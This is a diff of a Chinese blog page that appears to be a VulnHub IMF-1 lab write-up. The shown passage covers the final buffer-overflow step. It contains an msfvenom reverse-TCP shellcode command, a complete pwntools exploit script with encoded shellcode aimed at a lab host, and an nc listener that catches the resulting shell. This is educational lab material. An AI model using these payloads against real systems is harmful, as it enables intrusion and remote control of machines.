+<p>且通过IDA反编译可知：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://hertz-images.oss-cn-hangzhou.aliyuncs.com/img/202401161131719.png" alt="image-20240115165447884"></p>
 <p>在最后<code>retn</code>时，<code>eax</code>是指向栈中<code>&lt;ebp+s&gt;</code>的位置的；就相当于<code>gets</code>最开始输入的位置，所以我们只需要利用<code>gets(s)</code>将<code>shellcode</code>放在变量<code>s</code>的起始位置，在<code>retn</code>时使<code>EIP</code>指向<code>jmp eax</code>，即可执行我们所需的shellcode；最终exp的构造如下：<code>shellcode + &#39;a&#39;*(168-len(shellcode))+ addr(jmp eax)</code>；</p>
 <p>shellcode生成</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.5.130 LPORT=6666 -f py -b &#x27;\x00\x0a\x0b&#x27; -o</span><br><span class="line"> shellcode.py </span><br></pre></td></tr></table></figure></div>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.5.130 LPORT=6666 -f py -b &#x27;\x00\x0a\x0b&#x27; -o</span><br><span class="line"> shellcode.py </span><br></pre></td></tr></table></figure>
 
 <p><del>在最后完成利用前，我需要一点python与socket通信的内容</del>；<br>学了一点，不过最后实现还是利用pwntools中的函数完成的；</p>
-<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">rhost = <span class="string">&#x27;192.168.5.136&#x27;</span></span><br><span class="line">rport = <span class="number">7788</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### make payload</span></span><br><span class="line">shellcode =  <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xd9\xd0\xbf\x0e\x9e\x31\xd2\xd9\x74\x24\xf4\x5d&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x33\xc9\xb1\x12\x31\x7d\x17\x03\x7d\x17\x83\xe3&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x62\xd3\x27\xca\x41\xe3\x2b\x7f\x35\x5f\xc6\x7d&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x30\xbe\xa6\xe7\x8f\xc1\x54\xbe\xbf\xfd\x97\xc0&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x89\x78\xd1\xa8\xc9\xd3\x24\xaa\xa2\x21\x27\xb0&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x38\xaf\xc6\x74\x5a\xff\x59\x27\x10\xfc\xd0\x26&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x9b\x83\xb1\xc0\x4a\xab\x46\x78\xfb\x9c\x87\x1a&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x92\x6b\x34\x88\x37\xe5\x5a\x9c\xb3\x38\x1c&quot;</span></span><br><span class="line"></span><br><span class="line">jmp_eax = p32(<span class="number">0x08048563</span>)</span><br><span class="line">buf = <span class="string">b&#x27;a&#x27;</span>* (<span class="number">168</span> - <span class="built_in">len</span>(shellcode))</span><br><span class="line"></span><br><span class="line">payload = shellcode + buf + jmp_eax + <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">######### connect agent</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#### pwntools --- 连接</span></span><br><span class="line">r = remote(<span class="string">&#x27;192.168.5.136&#x27;</span>, <span class="number">7788</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;\nAgent ID : &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;48093572&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Enter selection: &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;report update: &#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#### socket --- 连接</span></span><br><span class="line"><span class="string">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span></span><br><span class="line"><span class="string">s.connect((rhost, rport))</span></span><br><span class="line"><span class="string">text_data = s.recv(1024).decode()</span></span><br><span class="line"><span class="string">print(text_data)</span></span><br><span class="line"><span class="string">s.send(b&quot;48093572\n&quot;)</span></span><br><span class="line"><span class="string">text_data = s.recv(1024).decode()</span></span><br><span class="line"><span class="string">print(text_data)</span></span><br><span class="line"><span class="string">s.send(b&quot;3\n&quot;)</span></span><br><span class="line"><span class="string">s.send(payload)</span></span><br><span class="line"><span class="string">stext_data = s.recv(1024).decode()</span></span><br><span class="line"><span class="string">print(text_data)</span></span><br><span class="line"><span class="string">print(&#x27;\n[+] Completed.&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></div>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">rhost = <span class="string">&#x27;192.168.5.136&#x27;</span></span><br><span class="line">rport = <span class="number">7788</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### make payload</span></span><br><span class="line">shellcode =  <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xd9\xd0\xbf\x0e\x9e\x31\xd2\xd9\x74\x24\xf4\x5d&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x33\xc9\xb1\x12\x31\x7d\x17\x03\x7d\x17\x83\xe3&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x62\xd3\x27\xca\x41\xe3\x2b\x7f\x35\x5f\xc6\x7d&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x30\xbe\xa6\xe7\x8f\xc1\x54\xbe\xbf\xfd\x97\xc0&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x89\x78\xd1\xa8\xc9\xd3\x24\xaa\xa2\x21\x27\xb0&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x38\xaf\xc6\x74\x5a\xff\x59\x27\x10\xfc\xd0\x26&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x9b\x83\xb1\xc0\x4a\xab\x46\x78\xfb\x9c\x87\x1a&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x92\x6b\x34\x88\x37\xe5\x5a\x9c\xb3\x38\x1c&quot;</span></span><br><span class="line"></span><br><span class="line">jmp_eax = p32(<span class="number">0x08048563</span>)</span><br><span class="line">buf = <span class="string">b&#x27;a&#x27;</span>* (<span class="number">168</span> - <span class="built_in">len</span>(shellcode))</span><br><span class="line"></span><br><span class="line">payload = shellcode + buf + jmp_eax + <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">######### connect agent</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#### pwntools --- 连接</span></span><br><span class="line">r = remote(<span class="string">&#x27;192.168.5.136&#x27;</span>, <span class="number">7788</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;\nAgent ID : &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;48093572&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Enter selection: &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;report update: &#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#### socket --- 连接</span></span><br><span class="line"><span class="string">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span></span><br><span class="line"><span class="string">s.connect((rhost, rport))</span></span><br><span class="line"><span class="string">text_data = s.recv(1024).decode()</span></span><br><span class="line"><span class="string">print(text_data)</span></span><br><span class="line"><span class="string">s.send(b&quot;48093572\n&quot;)</span></span><br><span class="line"><span class="string">text_data = s.recv(1024).decode()</span></span><br><span class="line"><span class="string">print(text_data)</span></span><br><span class="line"><span class="string">s.send(b&quot;3\n&quot;)</span></span><br><span class="line"><span class="string">s.send(payload)</span></span><br><span class="line"><span class="string">stext_data = s.recv(1024).decode()</span></span><br><span class="line"><span class="string">print(text_data)</span></span><br><span class="line"><span class="string">print(&#x27;\n[+] Completed.&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p>一个终端执行<code>nc -lvp 6666</code>监听反弹shell的请求；另一个终端执行<code>exp.py</code>使<code>agent</code>程序通过缓冲区溢出执行反弹shell对应的shellcode；</p>
 <p>提权成功！</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hertz-images.oss-cn-hangzhou.aliyuncs.com/img/202401161131751.png"
-                      alt="image-20240115191708603"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hertz-images.oss-cn-hangzhou.aliyuncs.com/img/202401161131782.png"
-                      alt="image-20240115191749384"
-                ></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://hertz-images.oss-cn-hangzhou.aliyuncs.com/img/202401161131751.png" alt="image-20240115191708603"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://hertz-images.oss-cn-hangzhou.aliyuncs.com/img/202401161131782.png" alt="image-20240115191749384"></p>
 <p>最后一个flag为<code>flag6&#123;R2gwc3RQcm90MGMwbHM=&#125;</code>，解码为<code>Gh0stProt0c0ls</code></p>
 <blockquote>
 <p>遇到的问题：注意socket通信需要<code>\n</code>作为结尾</p>
 </blockquote>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在这次的靶机的学习中，了解了php的弱类型及绕过：<br>传入数组类型的数据会使strcmp()返回0，md5返回NULL、strops()返回NULL，使sha1（）函数报错返回false；<br>以及关于利用科学计数法处理md4()和md5()函数，当加密后的值前两位<code>0e</code>时，会将整个值认为0从而不处理之后的字符串，利用起始相同的方法进行绕过；<br>以及利用<code>==</code>在判断相同前会进行类型转换，而php对于字符串转换为数值型时，若字符串起始位置不为合法数值则默认转换为<code>0</code>，而字符串中存在<code>.|E|e</code>，且数值的值在整型范围内，会转换为浮点型数据；<br><code>%00</code>会让<code>erge()</code>搜索截断，在%00之后的数值函数无法识别；<br>更加熟悉了<code>sqlmap</code>的参数设置；<br>以及最后的缓冲区溢出，对<code>gdb &amp; pwntools</code>进行一些学习与配置；</p>
 
-        </div>
 
-        
-            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
-                <div class="article-copyright-info-container">
-    <ul>
-        <li><strong>标题:</strong> VulnHub IMF-1 简单记录</li>
-        <li><strong>作者:</strong> Hertz</li>
-        <li><strong>创建于
-                :</strong> 2024-01-16 11:45:13</li>
-        
-            <li>
-                <strong>更新于
-                    :</strong> 2024-01-16 16:19:24
-            </li>
-        
-        <li>
-            <strong>链接:</strong> https://redefine.ohevan.com/2024/01/16/Vulnhub-IMF-1简单记录/
-        </li>
-        <li>
-            <strong>
-                版权声明:
-            </strong>
-            
 
-            
-                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
-            
-        </li>
-    </ul>
+<div class="article-footer reveal fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    </div>
+
+</article>
+
+
+
+
+
+
+
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>本站由 <a href="/">${author.name}</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.23.0">Stellar 1.23.0</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
 </div>
 
-            </div>
-        
-
-        
-            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
-                
-                    <li class="tag-item mx-0.5">
-                        <a href="/tags/vulnhub/">#vulnhub</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item mx-0.5">
-                        <a href="/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">#缓冲区溢出</a>&nbsp;
-                    </li>
-                
-            </ul>
-        
-
-        
-
-        
-
-
-        
-            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
-                <div class="comments-container mt-10 w-full ">
-    <div id="comment-anchor" class="w-full h-2.5"></div>
-    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
-        评论
     </div>
+  </div>
+  <div class='scripts'>
     
-
-        
-            
-    <div id="waline"></div>
-    <script type="module" data-swup-reload-script>
-      import { init } from '/js/libs/waline.mjs';
-
-      function loadWaline() {
-        init({
-          el: '#waline',
-          serverURL: 'https://example.example.com',
-          lang: 'zh-CN',
-          dark: 'body[class~="dark-mode"]',
-          requiredMeta: ['nick', 'mail'],
-          emoji: [],
-          recaptchaV3Key: "wasd",
-          
+<script type="text/javascript">
+  const stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
         });
       }
-
-      if (typeof swup !== 'undefined') {
-        loadWaline();
-      } else {
-        window.addEventListener('DOMContentLoaded', loadWaline);
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
       }
-    </script>
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
 
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = stellar.config.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
 
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.version = '1.23.0';
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.23.0';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+    root : '/',
+  };
 
-        
-    
-</div>
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://gcore.jsdelivr.net/npm/jquery@3.6.2/dist/jquery.min.js'
+  };
 
-            </div>
-        
-    </div>
+  if ('local_search') {
+    stellar.search = {};
+    stellar.search.service = 'local_search';
+    if (stellar.search.service == 'local_search') {
+      let service_obj = Object.assign({}, {"field":"all","path":"/search.json","content":true,"sort":"-date"});
+      stellar.search[stellar.search.service] = service_obj;
+    }
+  }
 
-    
-        <div class="toc-content-container">
-            <div class="post-toc-wrap">
-    <div class="post-toc">
-        <div class="toc-title">此页目录</div>
-        <div class="page-title">VulnHub IMF-1 简单记录</div>
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%8F%E8%BF%B0"><span class="nav-text">描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%A2%98%E8%A7%A3"><span class="nav-text">参考题解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95"><span class="nav-text">过程记录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol>
+  // stellar js
+  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js","linkcard":"/js/plugins/linkcard.js","fcircle":"/js/plugins/fcircle.js","weibo":"/js/plugins/weibo.js","memos":"/js/plugins/memos.js"});
 
-    </div>
-</div>
-        </div>
-    
-</div>
-
-
-
-                
-
-            </div>
-
-            
-
-        </div>
-
-        <div class="main-content-footer">
-            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
-    <div class="info-container py-3 text-center">
-        
-        <div class="text-center">
-            &copy;
-            
-              <span>2022</span>
-              -
-            
-            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Hertz</a>
-        </div>
-        
-            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
-            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
-                
-                    <span id="busuanzi_container_site_uv" class="lg:!block">
-                        <span class="text-sm">访问人数</span>
-                        <span id="busuanzi_value_site_uv"></span>
-                    </span>
-                
-                
-                    <span id="busuanzi_container_site_pv" class="lg:!block">
-                        <span class="text-sm">总访问量</span>
-                        <span id="busuanzi_value_site_pv"></span>
-                    </span>
-                
-            </div>
-        
-        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
-            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
-            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.0</a></span>
-        </div>
-        
-        
-            <div>
-                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
-            </div>
-        
-        
-            <script data-swup-reload-script>
-                try {
-                    function odometer_init() {
-                    const elements = document.querySelectorAll('.odometer');
-                    elements.forEach(el => {
-                        new Odometer({
-                            el,
-                            format: '( ddd).dd',
-                            duration: 200
-                        });
-                    });
-                    }
-                    odometer_init();
-                } catch (error) {}
-            </script>
-        
-        
-        
-    </div>  
-</footer>
-        </div>
-    </div>
-
-    
-        <div class="post-tools">
-            <div class="post-tools-container">
-    <ul class="article-tools-list">
-        <!-- TOC aside toggle -->
-        
-            <li class="right-bottom-tools page-aside-toggle">
-                <i class="fa-regular fa-outdent"></i>
-            </li>
-        
-
-        <!-- go comment -->
-        
-            <li class="go-comment">
-                <i class="fa-regular fa-comments"></i>
-            </li>
-        
-    </ul>
-</div>
-
-        </div>
-    
-
-    <div class="right-side-tools-container">
-        <div class="side-tools-container">
-    <ul class="hidden-tools-list">
-        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
-            <i class="fa-regular fa-magnifying-glass-plus"></i>
-        </li>
-
-        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
-            <i class="fa-regular fa-magnifying-glass-minus"></i>
-        </li>
-
-        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
-            <i class="fa-regular fa-moon"></i>
-        </li>
-
-        <!-- rss -->
-        
-
-        
-
-        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
-            <i class="fa-regular fa-arrow-down"></i>
-        </li>
-    </ul>
-
-    <ul class="visible-tools-list">
-        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
-            <i class="fa-regular fa-cog fa-spin"></i>
-        </li>
-        
-            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
-                <i class="arrow-up fas fa-arrow-up"></i>
-                <span class="percent"></span>
-            </li>
-        
-        
-    </ul>
-</div>
-
-    </div>
-
-    <div class="image-viewer-container">
-    <img src="">
-</div>
-
-
-    
-
-</main>
-
-
-    
-<script src="/js/libs/Swup.min.js"></script>
-
-<script src="/js/libs/SwupSlideTheme.min.js"></script>
-
-<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
-
-<script src="/js/libs/SwupProgressPlugin.min.js"></script>
-
-<script src="/js/libs/SwupScrollPlugin.min.js"></script>
-
-<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
-
-<script>
-    const swup = new Swup({
-        plugins: [
-            new SwupScriptsPlugin({
-                optin: true,
-            }),
-            new SwupProgressPlugin(),
-            new SwupScrollPlugin({
-                offset: 80,
-            }),
-            new SwupSlideTheme({
-                mainElement: ".main-content-body",
-            }),
-            new SwupPreloadPlugin(),
-        ],
-        containers: ["#swup"],
-    });
+  stellar.plugins.marked = Object.assign("https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js");
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/vanilla-lazyload@17.8.3/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@10.3/swiper-bundle.min.css","js":"https://unpkg.com/swiper@10.3/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://gcore.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
